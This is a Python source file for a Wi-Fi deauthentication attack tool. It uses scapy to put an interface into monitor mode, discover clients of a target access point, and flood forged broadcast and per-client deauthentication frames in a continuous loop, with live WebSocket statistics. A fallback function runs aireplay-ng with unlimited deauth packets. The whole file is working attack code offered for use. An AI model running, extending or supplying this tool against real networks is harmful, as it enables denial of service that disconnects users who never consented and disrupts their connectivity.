import subprocess
import time
import threading
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
import json
from datetime import datetime

class DeauthAttack:
    def __init__(self, interface, ssid, bssid, channel, websocket=None):
        self.interface = interface
        self.ssid = ssid
        self.bssid = bssid.lower()
        self.channel = str(channel)
        self.websocket = websocket
        self.running = False
        self.stats = {
            'packets_sent': 0,
            'start_time': None,
            'duration': 0,
            'errors': 0,
            'clients_targeted': 0
        }
        self.discovered_clients = set()
        self.error_log = []
        
    async def send_status_update(self, message_type, data):
        """Send status update via WebSocket"""
        if self.websocket:
            try:
                message = {
                    'type': message_type,
                    'timestamp': datetime.now().isoformat(),
                    'data': data
                }
                await self.websocket.send_text(json.dumps(message))
            except Exception as e:
                print(f"WebSocket error: {e}")
    
    def set_monitor_mode(self):
        """Set interface to monitor mode"""
        try:
            # Kill interfering processes
            subprocess.run(['airmon-ng', 'check', 'kill'], 
                         capture_output=True, check=False)
            
            # Set interface down
            subprocess.run(['ip', 'link', 'set', self.interface, 'down'], 
                         capture_output=True, check=True)
            
            # Set monitor mode
            subprocess.run(['iw', self.interface, 'set', 'monitor', 'control'], 
                         capture_output=True, check=True)
            
            # Set interface up
            subprocess.run(['ip', 'link', 'set', self.interface, 'up'], 
                         capture_output=True, check=True)
            
            return True
        except subprocess.CalledProcessError as e:
            self.error_log.append(f"Monitor mode setup failed: {e}")
            return False
        except Exception as e:
            self.error_log.append(f"Unexpected error in monitor mode: {e}")
            return False
    
    def set_channel(self):
        """Set interface to specific channel"""
        try:
            subprocess.run(['iw', self.interface, 'set', 'channel', self.channel], 
                         capture_output=True, check=True)
            return True
        except subprocess.CalledProcessError as e:
            self.error_log.append(f"Channel setting failed: {e}")
            return False
        except Exception as e:
            self.error_log.append(f"Unexpected error setting channel: {e}")
            return False
    
    def discover_clients(self):
        """Discover clients connected to the target AP"""
        def packet_handler(pkt):
            if not self.running:
                return
            
            try:
                if pkt.haslayer(Dot11):
                    # Check for data frames from/to our target BSSID
                    if (pkt.addr1 and pkt.addr1.lower() == self.bssid) or \
                       (pkt.addr2 and pkt.addr2.lower() == self.bssid) or \
                       (pkt.addr3 and pkt.addr3.lower() == self.bssid):
                        
                        # Extract client MAC addresses
                        client_mac = None
                        if pkt.addr1 and pkt.addr1.lower() != self.bssid and not pkt.addr1.startswith('ff:ff'):
                            client_mac = pkt.addr1.lower()
                        elif pkt.addr2 and pkt.addr2.lower() != self.bssid and not pkt.addr2.startswith('ff:ff'):
                            client_mac = pkt.addr2.lower()
                        
                        if client_mac and client_mac not in self.discovered_clients:
                            self.discovered_clients.add(client_mac)
                            asyncio.create_task(self.send_status_update('client_discovered', {
                                'client_mac': client_mac,
                                'total_clients': len(self.discovered_clients)
                            }))
            except Exception as e:
                self.stats['errors'] += 1
        
        # Start packet sniffing in a separate thread
        def sniff_clients():
            try:
                sniff(iface=self.interface, prn=packet_handler, 
                     stop_filter=lambda x: not self.running, timeout=1)
            except Exception as e:
                self.error_log.append(f"Client discovery error: {e}")
        
        client_thread = threading.Thread(target=sniff_clients, daemon=True)
        client_thread.start()
    
    def create_deauth_packet(self, client_mac="ff:ff:ff:ff:ff:ff"):
        """Create deauthentication packet"""
        try:
            # Create the deauth packet
            dot11 = Dot11(
                type=0,           # Management frame
                subtype=12,       # Deauthentication
                addr1=client_mac, # Destination (client or broadcast)
                addr2=self.bssid, # Source (AP)
                addr3=self.bssid  # BSSID
            )
            
            deauth = Dot11Deauth(reason=7)  # Reason: Class 3 frame received from nonassociated station
            
            # Combine with RadioTap header
            packet = RadioTap() / dot11 / deauth
            return packet
        except Exception as e:
            self.error_log.append(f"Packet creation error: {e}")
            return None
    
    def send_deauth_packets(self):
        """Send deauthentication packets continuously"""
        broadcast_packet = self.create_deauth_packet()
        if not broadcast_packet:
            return
        
        while self.running:
            try:
                # Send broadcast deauth (disconnects all clients)
                sendp(broadcast_packet, iface=self.interface, verbose=False, count=5)
                self.stats['packets_sent'] += 5
                
                # Send targeted deauth to discovered clients
                for client_mac in list(self.discovered_clients):
                    if not self.running:
                        break
                    
                    client_packet = self.create_deauth_packet(client_mac)
                    if client_packet:
                        sendp(client_packet, iface=self.interface, verbose=False, count=3)
                        self.stats['packets_sent'] += 3
                
                self.stats['clients_targeted'] = len(self.discovered_clients)
                
                # Send status update every 10 packets
                if self.stats['packets_sent'] % 50 == 0:
                    asyncio.create_task(self.send_status_update('stats_update', self.get_current_stats()))
                
                time.sleep(0.1)  # Small delay to prevent overwhelming
                
            except Exception as e:
                self.stats['errors'] += 1
                self.error_log.append(f"Packet sending error: {e}")
                time.sleep(1)  # Longer delay on error
    
    def get_current_stats(self):
        """Get current attack statistics"""
        if self.stats['start_time']:
            self.stats['duration'] = int(time.time() - self.stats['start_time'])
        
        return {
            'ssid': self.ssid,
            'bssid': self.bssid,
            'channel': self.channel,
            'packets_sent': self.stats['packets_sent'],
            'duration': self.stats['duration'],
            'clients_discovered': len(self.discovered_clients),
            'clients_targeted': self.stats['clients_targeted'],
            'errors': self.stats['errors'],
            'packets_per_second': self.stats['packets_sent'] / max(self.stats['duration'], 1),
            'status': 'running' if self.running else 'stopped'
        }
    
    async def start_attack(self):
        """Start the deauthentication attack"""
        try:
            await self.send_status_update('attack_starting', {
                'ssid': self.ssid,
                'bssid': self.bssid,
                'channel': self.channel
            })
            
            # Set monitor mode
            if not self.set_monitor_mode():
                await self.send_status_update('error', {
                    'message': 'Failed to set monitor mode',
                    'errors': self.error_log
                })
                return False
            
            await self.send_status_update('status', {'message': 'Monitor mode enabled'})
            
            # Set channel
            if not self.set_channel():
                await self.send_status_update('error', {
                    'message': f'Failed to set channel {self.channel}',
                    'errors': self.error_log
                })
                return False
            
            await self.send_status_update('status', {'message': f'Channel set to {self.channel}'})
            
            # Start the attack
            self.running = True
            self.stats['start_time'] = time.time()
            
            await self.send_status_update('attack_started', {
                'message': 'Deauthentication attack started',
                'target': f"{self.ssid} ({self.bssid})"
            })
            
            # Start client discovery
            self.discover_clients()
            
            # Start sending deauth packets in a separate thread
            deauth_thread = threading.Thread(target=self.send_deauth_packets, daemon=True)
            deauth_thread.start()
            
            # Send periodic updates
            while self.running:
                await asyncio.sleep(2)
                await self.send_status_update('stats_update', self.get_current_stats())
            
            return True
            
        except Exception as e:
            self.error_log.append(f"Attack start error: {e}")
            await self.send_status_update('error', {
                'message': f'Attack failed to start: {e}',
                'errors': self.error_log
            })
            return False
    
    async def stop_attack(self):
        """Stop the deauthentication attack"""
        self.running = False
        
        final_stats = self.get_current_stats()
        await self.send_status_update('attack_stopped', {
            'message': 'Deauthentication attack stopped',
            'final_stats': final_stats,
            'errors': self.error_log if self.error_log else None
        })
        
        return final_stats

# Legacy function for backward compatibility
def run_deauth_attack(bssid, interface):
    """Legacy function - kept for compatibility"""
    print("Starting deauthentication attack...")
    try:
        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", bssid, interface])
    except KeyboardInterrupt:
        print("Deauthentication stopped.")
